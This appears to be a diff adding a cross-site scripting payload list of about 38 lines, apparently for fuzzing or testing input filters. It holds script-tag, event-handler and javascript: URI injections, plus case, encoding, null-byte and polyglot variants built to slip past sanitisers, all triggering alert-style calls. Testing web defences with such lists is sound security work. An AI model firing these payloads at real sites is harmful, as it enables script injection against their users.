@@ -1,0 +1,38 @@
+<iframe src="javascript:alert(`xss`)">
+<script>alert(1)</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</script><script>alert(1)</script>
+<ScRiPt>alert(1)</sCrIpT>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<svg><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe onload=alert(1)></iframe>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<video><source onerror="alert(1)"></video>
+<audio src/onerror=alert(1)>
+<img src=x:alert(1) onerror=eval(src)>
+<body onscroll=alert(1)><br><br><br><br><input autofocus>
+javascript:alert(1)
+javascript:confirm(1)
+javascript:prompt(1)
+<a href="javascript:alert(1)">ClickMe</a>
+<iframe src="javascript:alert(1)"></iframe>
+<img src="javascript:alert(1)">
+<base href="javascript:alert(1);//">
+<form action="javascript:alert(1)"><button>X</button></form>
+<isindex formaction=javascript:alert(1) type=submit>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+<script\x20type="text/javascript">javascript:alert(1);</script>
+<script\x3Etype="text/javascript">javascript:alert(1);</script>
+<script\x0Dtype="text/javascript">javascript:alert(1);</script>
+<a href="javas\x00cript:javascript:alert(1)">ClickMeNull</a>
+<a href="javas\x0Dcript:javascript:alert(1)">ClickMeCR</a>
+<div style="width:expression(alert(1));">
